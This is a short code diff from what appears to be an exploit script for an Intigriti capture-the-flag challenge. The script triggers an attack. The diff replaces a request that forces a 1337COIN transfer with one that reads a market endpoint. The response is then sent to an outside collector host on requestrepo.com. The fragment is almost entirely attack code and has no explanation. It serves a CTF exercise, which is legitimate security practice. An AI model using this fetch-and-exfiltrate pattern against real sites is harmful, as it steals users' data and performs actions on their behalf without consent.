@@ -47,7 +47,7 @@
     
     executeAttack();      
 
-fetch('https://challenge-0126.intigriti.io/api/transaction?amount=1&currency=1337COIN&toAddress=xsss')
+fetch('https://challenge-0126.intigriti.io/api/marketwatch')
   .then(response => response.text()) 
   .then(data => {
     fetch('https://we6hfxdk.requestrepo.com/?dd=' + encodeURIComponent(data));
